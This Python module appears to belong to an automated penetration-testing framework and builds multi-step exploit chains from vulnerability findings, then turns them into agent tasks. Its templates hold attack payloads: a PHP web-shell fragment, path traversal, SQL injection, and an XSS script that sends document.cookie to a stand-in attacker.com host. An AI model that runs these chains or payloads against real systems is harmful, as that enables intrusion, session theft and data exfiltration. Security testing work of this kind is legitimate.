"""
Tier 2: Exploit Chain Builder
==============================
Constructs multi-step exploit chains from vulnerability findings.
Chains vulnerabilities together to achieve higher-impact attacks.

Features:
- ChainStep and ExploitChain dataclasses
- ExploitChainBuilder for analyzing and constructing chains
- Predefined chain templates for common attack patterns
- Validation and success estimation for chains
- Integration with Blackboard task system
"""

from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum
import json
from datetime import datetime


class VulnerabilityType(Enum):
    """Enumeration of vulnerability types."""
    IDOR = "idor"
    FILE_UPLOAD = "file_upload"
    LFI = "lfi"
    RCE = "rce"
    SQLI = "sqli"
    XSS = "xss"
    SSRF = "ssrf"
    SESSION_HIJACK = "session_hijack"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    AUTH_BYPASS = "auth_bypass"
    API_KEY_LEAK = "api_key_leak"
    DIRECTORY_LISTING = "directory_listing"
    CONFIG_FILE_ACCESS = "config_file_access"
    CREDENTIAL_EXTRACTION = "credential_extraction"
    INFO_DISCLOSURE = "info_disclosure"
    USER_ENUMERATION = "user_enumeration"
    MASS_DATA_EXTRACTION = "mass_data_extraction"
    UNAUTHORIZED_API_ACCESS = "unauthorized_api_access"
    DATA_EXFILTRATION = "data_exfiltration"
    ACCOUNT_TAKEOVER = "account_takeover"
    INTERNAL_SERVICE_ACCESS = "internal_service_access"


class KillChainPhase(Enum):
    """MITRE Kill Chain phases."""
    RECONNAISSANCE = 1
    WEAPONIZATION = 2
    DELIVERY = 3
    EXPLOITATION = 4
    INSTALLATION = 5
    COMMAND_AND_CONTROL = 6
    ACTIONS_ON_OBJECTIVES = 7


class AgentType(Enum):
    """Agent types that can execute steps."""
    RECON = "recon"
    EXPLOIT = "exploit"
    EXECUTION = "execution"
    ANALYSIS = "analysis"


@dataclass
class ChainStep:
    """
    A single step in an exploit chain.
    
    Attributes:
        vulnerability: Type of vulnerability (e.g., "idor", "file_upload", "lfi")
        payload: The actual payload or attack string
        preconditions: List of conditions that must be true before executing this step
        postconditions: List of conditions that this step achieves
        agent: Which agent executes this step ("recon", "exploit", "execution", "analysis")
        confidence: Confidence level of this step (0.0-1.0)
        kill_chain_phase: Kill chain phase number (1-7)
        impact_level: Impact if successful ("low", "medium", "high", "critical")
        estimated_difficulty: How difficult to execute (1-10 scale)
    """
    vulnerability: str
    payload: str
    preconditions: List[str] = field(default_factory=list)
    postconditions: List[str] = field(default_factory=list)
    agent: str = "exploit"
    confidence: float = 0.7
    kill_chain_phase: int = 4
    impact_level: str = "medium"
    estimated_difficulty: int = 5
    
    def to_dict(self) -> Dict:
        """Convert ChainStep to dictionary representation."""
        return {
            "vulnerability": self.vulnerability,
            "payload": self.payload,
            "preconditions": self.preconditions,
            "postconditions": self.postconditions,
            "agent": self.agent,
            "confidence": self.confidence,
            "kill_chain_phase": self.kill_chain_phase,
            "impact_level": self.impact_level,
            "estimated_difficulty": self.estimated_difficulty
        }


@dataclass
class ExploitChain:
    """
    A complete exploit chain combining multiple steps.
    
    Attributes:
        steps: Ordered list of ChainStep objects
        total_confidence: Product of all step confidences
        max_severity: Maximum severity of any step ("low", "medium", "high", "critical")
        description: Human-readable description of the chain
        required_agents: List of agent types needed to execute the chain
        chain_id: Unique identifier for this chain
        created_at: Timestamp of chain creation
    """
    steps: List[ChainStep]
    total_confidence: float = 0.0
    max_severity: str = "medium"
    description: str = ""
    required_agents: List[str] = field(default_factory=list)
    chain_id: str = ""
    created_at: str = ""
    
    def __post_init__(self):
        """Calculate total confidence and set chain_id if not provided."""
        if self.total_confidence == 0.0 and self.steps:
            self.total_confidence = self._calculate_total_confidence()
        if not self.chain_id:
            self.chain_id = self._generate_chain_id()
        if not self.created_at:
            self.created_at = datetime.now().isoformat()
    
    def _calculate_total_confidence(self) -> float:
        """Calculate confidence as product of step confidences."""
        confidence = 1.0
        for step in self.steps:
            confidence *= step.confidence
        return round(confidence, 4)
    
    def _generate_chain_id(self) -> str:
        """Generate unique chain ID from vulnerabilities."""
        vulns = "_".join([step.vulnerability for step in self.steps])
        return f"chain_{vulns}_{len(self.steps)}"
    
    def to_dict(self) -> Dict:
        """Convert ExploitChain to dictionary representation."""
        return {
            "chain_id": self.chain_id,
            "description": self.description,
            "total_confidence": self.total_confidence,
            "max_severity": self.max_severity,
            "required_agents": self.required_agents,
            "steps": [step.to_dict() for step in self.steps],
            "created_at": self.created_at
        }


# Predefined exploit chain templates
CHAIN_TEMPLATES = {
    "file_upload_rce": {
        "description": "File upload to RCE chain",
        "steps": [
            ChainStep(
                vulnerability="file_upload",
                payload="upload_shell.php",
                preconditions=["upload_endpoint_accessible"],
                postconditions=["file_uploaded"],
                agent="exploit",
                confidence=0.8,
                kill_chain_phase=4,
                impact_level="high"
            ),
            ChainStep(
                vulnerability="lfi",
                payload="../../../var/www/html/uploads/shell.php",
                preconditions=["file_uploaded"],
                postconditions=["file_accessible"],
                agent="exploit",
                confidence=0.75,
                kill_chain_phase=4,
                impact_level="high"
            ),
            ChainStep(
                vulnerability="rce",
                payload="exec($_GET['cmd'])",
                preconditions=["file_accessible"],
                postconditions=["remote_code_execution"],
                agent="execution",
                confidence=0.9,
                kill_chain_phase=5,
                impact_level="critical"
            )
        ]
    },
    "auth_bypass_escalation": {
        "description": "SQL injection auth bypass to privilege escalation",
        "steps": [
            ChainStep(
                vulnerability="sqli",
                payload="' OR '1'='1",
                preconditions=["login_form_accessible"],
                postconditions=["auth_bypassed"],
                agent="exploit",
                confidence=0.85,
                kill_chain_phase=4,
                impact_level="high"
            ),
            ChainStep(
                vulnerability="session_hijack",
                payload="steal_session_token",
                preconditions=["auth_bypassed"],
                postconditions=["session_obtained"],
                agent="exploit",
                confidence=0.7,
                kill_chain_phase=5,
                impact_level="high"
            ),
            ChainStep(
                vulnerability="privilege_escalation",
                payload="escalate_to_admin",
                preconditions=["session_obtained"],
                postconditions=["admin_access"],
                agent="execution",
                confidence=0.65,
                kill_chain_phase=5,
                impact_level="critical"
            )
        ]
    },
    "ssrf_to_rce": {
        "description": "SSRF to internal service access to RCE",
        "steps": [
            ChainStep(
                vulnerability="ssrf",
                payload="http://localhost:6379",
                preconditions=["ssrf_endpoint_found"],
                postconditions=["internal_access"],
                agent="exploit",
                confidence=0.8,
                kill_chain_phase=4,
                impact_level="high"
            ),
            ChainStep(
                vulnerability="internal_service_access",
                payload="EVAL 'os.system(...)'",
                preconditions=["internal_access"],
                postconditions=["service_compromised"],
                agent="exploit",
                confidence=0.7,
                kill_chain_phase=5,
                impact_level="high"
            ),
            ChainStep(
                vulnerability="rce",
                payload="execute_system_command",
                preconditions=["service_compromised"],
                postconditions=["remote_code_execution"],
                agent="execution",
                confidence=0.85,
                kill_chain_phase=5,
                impact_level="critical"
            )
        ]
    },
    "xss_to_account_takeover": {
        "description": "XSS to session theft to account takeover",
        "steps": [
            ChainStep(
                vulnerability="xss",
                payload="<script>fetch('attacker.com?cookie='+document.cookie)</script>",
                preconditions=["xss_point_found"],
                postconditions=["xss_injected"],
                agent="exploit",
                confidence=0.8,
                kill_chain_phase=4,
                impact_level="high"
            ),
            ChainStep(
                vulnerability="session_hijack",
                payload="steal_session_cookie",
                preconditions=["xss_injected"],
                postconditions=["session_stolen"],
                agent="exploit",
                confidence=0.85,
                kill_chain_phase=5,
                impact_level="high"
            ),
            ChainStep(
                vulnerability="account_takeover",
                payload="impersonate_user",
                preconditions=["session_stolen"],
                postconditions=["account_compromised"],
                agent="execution",
                confidence=0.9,
                kill_chain_phase=5,
                impact_level="critical"
            )
        ]
    },
    "idor_to_data_breach": {
        "description": "IDOR to user enumeration to mass data extraction",
        "steps": [
            ChainStep(
                vulnerability="idor",
                payload="GET /api/users/1/profile",
                preconditions=["api_endpoint_found"],
                postconditions=["user_data_accessible"],
                agent="exploit",
                confidence=0.85,
                kill_chain_phase=4,
                impact_level="high"
            ),
            ChainStep(
                vulnerability="user_enumeration",
                payload="enumerate_user_ids",
                preconditions=["user_data_accessible"],
                postconditions=["user_count_determined"],
                agent="recon",
                confidence=0.9,
                kill_chain_phase=1,
                impact_level="medium"
            ),
            ChainStep(
                vulnerability="mass_data_extraction",
                payload="extract_all_user_profiles",
                preconditions=["user_count_determined"],
                postconditions=["data_exfiltrated"],
                agent="exploitation",
                confidence=0.88,
                kill_chain_phase=6,
                impact_level="critical"
            )
        ]
    },
    "info_disclosure_chain": {
        "description": "Directory listing to config access to credential extraction",
        "steps": [
            ChainStep(
                vulnerability="directory_listing",
                payload="GET /admin/",
                preconditions=["web_server_accessible"],
                postconditions=["directory_listing_enabled"],
                agent="recon",
                confidence=0.7,
                kill_chain_phase=1,
                impact_level="medium"
            ),
            ChainStep(
                vulnerability="config_file_access",
                payload="GET /admin/config.php",
                preconditions=["directory_listing_enabled"],
                postconditions=["config_file_found"],
                agent="exploit",
                confidence=0.8,
                kill_chain_phase=4,
                impact_level="high"
            ),
            ChainStep(
                vulnerability="credential_extraction",
                payload="parse_credentials",
                preconditions=["config_file_found"],
                postconditions=["credentials_obtained"],
                agent="analysis",
                confidence=0.95,
                kill_chain_phase=2,
                impact_level="critical"
            )
        ]
    },
    "api_abuse_chain": {
        "description": "API key leak to unauthorized access to data exfiltration",
        "steps": [
            ChainStep(
                vulnerability="api_key_leak",
                payload="find_api_key_in_source",
                preconditions=["source_code_accessible"],
                postconditions=["api_key_obtained"],
                agent="recon",
                confidence=0.75,
                kill_chain_phase=1,
                impact_level="high"
            ),
            ChainStep(
                vulnerability="unauthorized_api_access",
                payload="use_leaked_api_key",
                preconditions=["api_key_obtained"],
                postconditions=["api_authenticated"],
                agent="exploit",
                confidence=0.95,
                kill_chain_phase=4,
                impact_level="high"
            ),
            ChainStep(
                vulnerability="data_exfiltration",
                payload="dump_all_api_data",
                preconditions=["api_authenticated"],
                postconditions=["data_exfiltrated"],
                agent="execution",
                confidence=0.9,
                kill_chain_phase=6,
                impact_level="critical"
            )
        ]
    }
}


class ExploitChainBuilder:
    """
    Builds exploit chains from vulnerability findings.
    Analyzes findings to determine combinable vulnerabilities and constructs chains.
    """
    
    def __init__(self):
        """Initialize the chain builder with predefined templates."""
        self.templates = CHAIN_TEMPLATES
        self.severity_levels = {"low": 1, "medium": 2, "high": 3, "critical": 4}
    
    def build_chain(self, findings: List[Dict]) -> List[ExploitChain]:
        """
        Analyze findings and build exploit chains.
        
        Args:
            findings: List of vulnerability findings from reconnaissance
            
        Returns:
            List of ExploitChain objects sorted by total_confidence (highest first)
        """
        chains = []
        
        # Try to match findings against templates
        matched_templates = self._match_templates(findings)
        for template_name, template_config in matched_templates:
            chain = self._build_from_template(template_name, template_config, findings)
            if chain:
                chains.append(chain)
        
        # Try to build custom chains from findings
        custom_chains = self._build_custom_chains(findings)
        chains.extend(custom_chains)
        
        # Sort by total confidence (descending)
        chains.sort(key=lambda x: x.total_confidence, reverse=True)
        
        return chains
    
    def _match_templates(self, findings: List[Dict]) -> List[tuple]:
        """
        Match findings against predefined chain templates.
        
        Args:
            findings: List of vulnerability findings
            
        Returns:
            List of (template_name, template_config) tuples that match findings
        """
        matched = []
        finding_vulns = {f.get("vulnerability_type") for f in findings}
        
        for template_name, template_config in self.templates.items():
            template_vulns = {step.vulnerability for step in template_config["steps"]}
            # Check if we have at least 2 of the template vulnerabilities
            if len(template_vulns & finding_vulns) >= 2:
                matched.append((template_name, template_config))
        
        return matched
    
    def _build_from_template(self, template_name: str, template_config: Dict, 
                            findings: List[Dict]) -> Optional[ExploitChain]:
        """
        Build a chain from a predefined template.
        
        Args:
            template_name: Name of the template
            template_config: Template configuration
            findings: Available findings
            
        Returns:
            ExploitChain if successful, None otherwise
        """
        steps = template_config.get("steps", [])
        description = template_config.get("description", f"Chain: {template_name}")
        
        # Adjust step confidence based on findings
        adjusted_steps = []
        for step in steps:
            adjusted_step = self._adjust_step_confidence(step, findings)
            adjusted_steps.append(adjusted_step)
        
        # Determine max severity
        max_severity = max(
            [step.impact_level for step in adjusted_steps],
            key=lambda x: self.severity_levels.get(x, 0)
        )
        
        # Get required agents
        required_agents = list(set(step.agent for step in adjusted_steps))
        
        chain = ExploitChain(
            steps=adjusted_steps,
            max_severity=max_severity,
            description=description,
            required_agents=required_agents
        )
        
        return chain if self.validate_chain(chain) else None
    
    def _adjust_step_confidence(self, step: ChainStep, findings: List[Dict]) -> ChainStep:
        """
        Adjust step confidence based on actual findings.
        
        Args:
            step: The chain step
            findings: Available findings
            
        Returns:
            Adjusted ChainStep with updated confidence
        """
        # Find matching finding
        for finding in findings:
            if finding.get("vulnerability_type") == step.vulnerability:
                # Boost confidence if finding is confirmed
                if finding.get("status") == "confirmed":
                    step.confidence = min(1.0, step.confidence * 1.1)
                # Reduce confidence if finding is theoretical
                elif finding.get("status") == "theoretical":
                    step.confidence = max(0.1, step.confidence * 0.8)
        
        return step
    
    def _build_custom_chains(self, findings: List[Dict]) -> List[ExploitChain]:
        """
        Build custom chains by analyzing finding relationships.
        
        Args:
            findings: List of vulnerability findings
            
        Returns:
            List of custom ExploitChain objects
        """
        chains = []
        
        if len(findings) < 2:
            return chains
        
        # Try to build chains from 2-3 findings
        for i, finding1 in enumerate(findings):
            for finding2 in findings[i+1:]:
                # Check if these can be chained
                if self._can_chain_findings(finding1, finding2):
                    steps = [
                        ChainStep(
                            vulnerability=finding1.get("vulnerability_type", "unknown"),
                            payload=finding1.get("payload", ""),
                            confidence=finding1.get("confidence", 0.7),
                            preconditions=[finding1.get("precondition", "")],
                            postconditions=[finding2.get("precondition", "")]
                        ),
                        ChainStep(
                            vulnerability=finding2.get("vulnerability_type", "unknown"),
                            payload=finding2.get("payload", ""),
                            confidence=finding2.get("confidence", 0.7),
                            preconditions=[finding2.get("precondition", "")],
                            postconditions=[finding2.get("impact", "")]
                        )
                    ]
                    
                    chain = ExploitChain(
                        steps=steps,
                        description=f"Custom chain: {finding1.get('vulnerability_type')} -> {finding2.get('vulnerability_type')}",
                        required_agents=["exploit"]
                    )
                    
                    if self.validate_chain(chain):
                        chains.append(chain)
        
        return chains
    
    def _can_chain_findings(self, finding1: Dict, finding2: Dict) -> bool:
        """
        Determine if two findings can be chained together.
        
        Args:
            finding1: First finding
            finding2: Second finding
            
        Returns:
            True if findings can be chained, False otherwise
        """
        # Simple heuristic: if finding1's impact is finding2's precondition
        impact = finding1.get("impact", "")
        precondition = finding2.get("precondition", "")
        
        return len(impact) > 0 and len(precondition) > 0 and impact in precondition
    
    def validate_chain(self, chain: ExploitChain) -> bool:
        """
        Validate that a chain is executable.
        
        Args:
            chain: ExploitChain to validate
            
        Returns:
            True if chain is valid, False otherwise
        """
        if not chain.steps or len(chain.steps) < 2:
            return False
        
        # Check that preconditions can be met
        postconditions_met = set()
        
        for step in chain.steps:
            # Check if preconditions are met
            for precondition in step.preconditions:
                if precondition not in postconditions_met and precondition:
                    # First step can have unmet preconditions (initial conditions)
                    if step != chain.steps[0]:
                        return False
            
            # Add postconditions to set
            postconditions_met.update(step.postconditions)
        
        return True
    
    def estimate_success(self, chain: ExploitChain) -> float:
        """
        Estimate overall success probability of a chain.
        
        Args:
            chain: ExploitChain to estimate
            
        Returns:
            Float between 0.0 and 1.0 representing success probability
        """
        if not chain.steps:
            return 0.0
        
        # Base probability is the product of step confidences
        probability = chain.total_confidence
        
        # Adjust based on severity and complexity
        difficulty_factor = 1.0
        for step in chain.steps:
            difficulty_factor *= (1.0 - (step.estimated_difficulty / 20.0))
        
        probability *= difficulty_factor
        
        # Ensure result is in valid range
        return max(0.0, min(1.0, probability))
    
    def to_blackboard_tasks(self, chain: ExploitChain) -> List[Dict]:
        """
        Convert an exploit chain to Blackboard task entries.
        
        Args:
            chain: ExploitChain to convert
            
        Returns:
            List of task dictionaries for the Blackboard system
        """
        tasks = []
        
        for i, step in enumerate(chain.steps):
            task = {
                "task_id": f"{chain.chain_id}_step_{i+1}",
                "chain_id": chain.chain_id,
                "step_number": i + 1,
                "total_steps": len(chain.steps),
                "vulnerability": step.vulnerability,
                "payload": step.payload,
                "agent_type": step.agent,
                "confidence": step.confidence,
                "kill_chain_phase": step.kill_chain_phase,
                "impact_level": step.impact_level,
                "preconditions": step.preconditions,
                "postconditions": step.postconditions,
                "status": "pending",
                "created_at": chain.created_at,
                "estimated_difficulty": step.estimated_difficulty
            }
            tasks.append(task)
        
        return tasks


def analyze_chains(chains: List[ExploitChain]) -> Dict:
    """
    Analyze a set of exploit chains.
    
    Args:
        chains: List of ExploitChain objects
        
    Returns:
        Dictionary with chain analysis
    """
    if not chains:
        return {
            "total_chains": 0,
            "analysis": "No chains generated"
        }
    
    analysis = {
        "total_chains": len(chains),
        "avg_confidence": sum(c.total_confidence for c in chains) / len(chains),
        "max_confidence": max(c.total_confidence for c in chains),
        "chains_by_severity": {},
        "chains_by_agent_requirement": {}
    }
    
    # Analyze by severity
    for severity in ["low", "medium", "high", "critical"]:
        count = len([c for c in chains if c.max_severity == severity])
        analysis["chains_by_severity"][severity] = count
    
    # Analyze by agent requirements
    all_agents = set()
    for chain in chains:
        all_agents.update(chain.required_agents)
    
    for agent in all_agents:
        count = len([c for c in chains if agent in c.required_agents])
        analysis["chains_by_agent_requirement"][agent] = count
    
    return analysis


# Example usage
if __name__ == "__main__":
    # Example findings
    example_findings = [
        {
            "vulnerability_type": "file_upload",
            "payload": "shell.php",
            "confidence": 0.85,
            "status": "confirmed",
            "precondition": "upload_endpoint_accessible",
            "impact": "file_uploaded"
        },
        {
            "vulnerability_type": "lfi",
            "payload": "../../../var/www/html/uploads/",
            "confidence": 0.75,
            "status": "confirmed",
            "precondition": "file_uploaded",
            "impact": "file_accessible"
        },
        {
            "vulnerability_type": "rce",
            "payload": "exec($_GET['cmd'])",
            "confidence": 0.9,
            "status": "theoretical",
            "precondition": "file_accessible",
            "impact": "remote_code_execution"
        }
    ]
    
    # Build chains
    builder = ExploitChainBuilder()
    chains = builder.build_chain(example_findings)
    
    # Print results
    print(f"Built {len(chains)} chains:")
    for chain in chains:
        print(f"\n  Chain ID: {chain.chain_id}")
        print(f"  Description: {chain.description}")
        print(f"  Confidence: {chain.total_confidence}")
        print(f"  Max Severity: {chain.max_severity}")
        print(f"  Steps: {len(chain.steps)}")
        
        tasks = builder.to_blackboard_tasks(chain)
        print(f"  Blackboard tasks: {len(tasks)}")
